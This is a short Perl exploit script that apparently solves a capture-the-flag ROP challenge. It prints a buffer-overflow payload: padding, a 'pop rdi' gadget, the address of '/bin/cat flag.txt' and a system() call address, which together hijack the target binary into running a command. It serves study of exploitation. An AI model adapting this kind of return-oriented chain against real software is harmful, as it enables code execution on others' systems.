#!/usr/bin/perl

$PADDING="B"x40;
$GADGET="\x83\x08\x40\x00\x00\x00\x00\x00"; # pop rdi, ret
$BINCAT="\x60\x10\x60\x00\x00\x00\x00\x00"; # Addr of "/bin/cat flag.txt"
$SYSTEM="\x10\x08\x40\x00\x00\x00\x00\x00"; # Addr of the system() call in 'usefulFunction'

print $PADDING . $GADGET . $BINCAT . $SYSTEM
